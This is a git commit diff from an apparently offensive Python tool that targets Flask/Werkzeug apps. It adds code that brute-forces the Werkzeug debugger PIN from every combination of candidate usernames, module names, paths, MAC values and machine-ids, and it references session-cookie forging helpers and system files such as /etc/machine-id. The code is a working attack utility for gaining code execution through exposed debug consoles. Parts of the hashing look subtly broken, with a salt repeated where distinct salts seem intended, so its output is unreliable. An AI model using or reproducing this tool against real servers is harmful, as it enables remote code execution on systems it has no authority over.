d570899781dd098068f4b1aa289623c1e1dd4685
skeleton <skeleton@arch.org>
2023-12-18 15:28:59 +0200

    Added Werkzeug PIN generation utility

--- src/vial/utils.py
+++ src/vial/utils.py
@@ -2,26 +2,29 @@ import vial
 from vial.session import decode, sign
 from rich.prompt import Prompt as prompt
 from rich.prompt import Confirm as confirm
+from rich.table import Table
 import json
 import requests
 import ipaddress
 import netifaces
 from typing import TypedDict
 import hashlib
-from itertools import chain
+from itertools import chain, product
 import tomllib
+from collections import ChainMap
+
 
 class Proxy(TypedDict):
     http: str
     https: str
 
 
-def check_iface(i: str): 
+def check_iface(iface: str): 
     try:
-        host = ipaddress.IPv4Address(i)
+        host = ipaddress.IPv4Address(iface)
     except ipaddress.AddressValueError:
         try:
-            host = netifaces.ifaddresses(i)[netifaces.AF_INET][0]["addr"]
+            host = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]["addr"]
         except ValueError:
             vial.log.error(
                 "Error detering HTTP hosting address. Did you provide an [underline]interface[/underline] or [underline]ip[/underline]?"
@@ -94,51 +97,31 @@ def fetch_cookie(
     vial.log.info(f"[bold green][+][/] Session cookie: [bold]{cookie}[/]")
     return cookie
 
-def generate_pin(config: str) -> bytes:
-    """
+def generate_pin(
+        username,
+        modname,
+        appname,
+        app_path,
+        node_uuid,
+        machine_id
+    ) -> str:
+    salt = vial.DEFAULT_SALT.encode()
     public_bits = [
-        username
-        modname
-        getattr(app, '__name__', getattr(app.__class__, '__name__'))
-        getattr(mod, '__file__', None),
+        username,
+        modname,
+        appname
     ]
     private_bits = [
-        str(uuid.getnode()),  /sys/class/net/ens33/address
-        get_machine_id(), /etc/machine-id
+        node_uuid,
+        machine_id
     ]
-
-    LOGIC:
-    - Parse the configuration and retrieve private/public bytes.
-    - Generate and return PIN
-    """
-    with open(config, "rb") as fd:
-        data = tomllib.load(fd)["pin_gen"]
-        pinsalt = data["pinsalt"]
-        public_bits = {
-            "username": data["username"],
-            "modname": data["modname"],
-            "magic": data["magic"],
-            "abs_path": data["abs_path"],
-            "platform": data["platform"]
-        } 
-        private_bits = {
-            "mac": data["mac"],
-            "machine-id": data["machine-id"]
-        } 
-    # Check if bits are configured properly
-    for bit in chain(public_bits, private_bits):
-        if not bit in ("platform") and bit == "": # Will change to ("platform", "abs_path")
-            vial.log.error("Missing required bits.")
-
-    vial.log.info(f"Using config -> {config}:\n{data}")
-    salt = vial.DEFAULT_SALT.encode()
     #h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
-    h = hashlib.sha1()
-    for bit in chain(public_bits.values(), private_bits.values()):
+    h = hashlib.sha1() 
+    for bit in chain(public_bits, private_bits):
         if not bit:
             continue
         if isinstance(bit, str):
-            bit = bit.encode()
+            bit = bit.encode('utf-8')
         h.update(bit)
     h.update(salt)
 
@@ -146,17 +129,89 @@ def generate_pin(config: str) -> bytes:
 
     num = None
     if num is None:
-        h.update(pinsalt.encode())
+        h.update(salt)
         num = ('%09d' % int(h.hexdigest(), 16))[:9]
 
     rv = None
     if rv is None:
         for group_size in 5, 4, 3:
             if len(num) % group_size == 0:
-                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size))
+                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                              for x in range(0, len(num), group_size))
                 break
-         
-    else:
-        rv = num
-    vial.log.info(f"PIN: [bold]{rv}[/]")
-    return rv
+        else:
+            rv = num
+
+    return rv 
+
+def pin_handler(config: str) -> bytes:
+    """
+    public_bits = [
+        username,
+        modname,
+        app_name,
+        path
+    ]
+    private_bits = [
+        mac,
+        machine_id
+    ]
+    """
+    #NOTE: Parse config.toml and extract public/private bits.
+    with open(config, "rb") as fd:
+        data = tomllib.load(fd)["pin_gen"]
+
+    values = [
+        data[bit] for bit in (
+            "usernames",
+            "modnames",
+            "appnames",
+            "paths", 
+            "node_uuid",
+            "machine_id"
+        )
+    ]
+    #data_bits = {
+    #    "public": [],
+    #    "private": []
+    #}
+    #data_bits["public"] = [
+    #    data[bit] for bit in (
+    #        "username",
+    #        "modname",
+    #        "app_name",
+    #        "paths"
+    #    )
+    #]
+    #data_bits["private"] = [
+    #    data[bit] for bit in (
+    #        "mac",
+    #        "machine-id"
+    #    )
+    #]
+    vial.log.info(f"Using config -> {config}:\n{data}")
+    
+    #NOTE: Filter out the optional/empty bits
+    #combined_bits = ChainMap(public_bits, private_bits)
+    #values = [
+    #    value for value in combined_bits.values()
+    #    if value not in ("", [])
+    #]
+    #NOTE: Check if the required public/private bits exist.
+    #values = []
+    #for value_list in data_bits.values():
+    #    for value in value_list:
+    #        values.append(value)
+    if len(values) != len(data.keys()) - 1:
+        vial.log.critical("Missing required bits.")
+        exit(1)
+    #NOTE: Generate a PIN for all the combinations
+    combinations = product(*values)
+    table = Table(title="Werkzeug Possible PINs")
+    table.add_column("PINs", justify="left", style="green", no_wrap=True)
+    table.add_column("Combination", style="cyan")
+
+    for combo in combinations:
+        pin = generate_pin(*combo)
+        table.add_row(pin, str(combo))
+    vial.console.print(table)
